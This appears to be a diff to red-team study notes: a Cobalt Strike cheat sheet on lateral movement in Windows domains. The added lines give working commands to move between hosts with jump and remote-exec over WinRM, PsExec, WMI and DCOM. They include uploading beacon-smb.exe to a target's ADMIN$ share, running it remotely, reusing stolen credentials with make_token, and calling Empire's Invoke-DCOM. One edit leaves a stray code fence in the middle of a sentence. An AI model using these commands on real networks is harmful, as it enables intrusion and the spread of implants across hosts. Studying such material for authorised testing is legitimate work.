@@ -44,7 +44,7 @@ connect localhost 4444
 elevate svc-exe
 ```
 
-### Lateral movement
+## Lateral movement
 #### Jump
 ```
 jump [method] [target] [listener]
@@ -68,5 +68,45 @@ remote-exec [method] [target] [command]
 ```
 
 #### Using credentials
-Each of these strategies are compatible with the various credential and impersonation methods described in the next section, Credentials & User Impersonation. For instance, if you have plaintext credentials of a domain user who is a local administrator on a target, use ```make_token``` and then ```jump``` to use that user's credentials to move laterally to the target.
+Each of these strategies are compatible with the various credential and impersonation methods described in the next section, Credentials & User Impersonation. For instance, if you have plaintext 
+```credentials of a domain user who is a local administrator on a target, use ```make_token``` and then ```jump``` to use that user's credentials to move laterally to the target.
 
+### PowerShell Remoting
+#### Getting the architectur
+- for winrm or winrm64 with jump
+```
+remote-exec winrm <HOSTNAME> (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+```
+
+#### Jump winrm smb beacon
+```
+jump winrm64 <HOSTNAME> smb
+```
+
+### PSexec
+```
+jump psexec64 <HOSTNAME> smb
+```
+
+### WMI
+```
+cd \\<HOSTNAME>\ADMIN$
+upload C:\Payloads\beacon-smb.exe
+remote-exec wmi <HOSTNAME> C:\Windows\beacon-smb.exe
+```
+
+#### CoInitializeSecurity
+- Beacon's internal implementation of WMI uses a Beacon Object File, executed using the beacon_inline_execute Aggressor function. When a BOF is executed the CoInitializeSecurity COM object can be called, which is used to set the security context for the current process. According to Microsoft's documentation, this can only be called once per process. The unfortunate consequence is that if you have CoInitializeSecurity get called in the context of, say "User A", then future BOFs may not be able to inherit a different security context ("User B") for the lifetime of the Beacon process.
+- if CoInitializeSecurity has already been called, WMI fails with access denied.
+- As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as spawn and spawnas, or even execute-assembly with a tool such as SharpWMI.
+
+```
+remote-exec wmi srv-2 calc
+execute-assembly SharpWMI.exe action=exec computername=<HOSTNAME> command="C:\Windows\System32\calc.exe"
+```
+
+#### DCOM
+- https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
+```
+powershell Invoke-DCOM -ComputerName <HOSTNAME> -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
+```
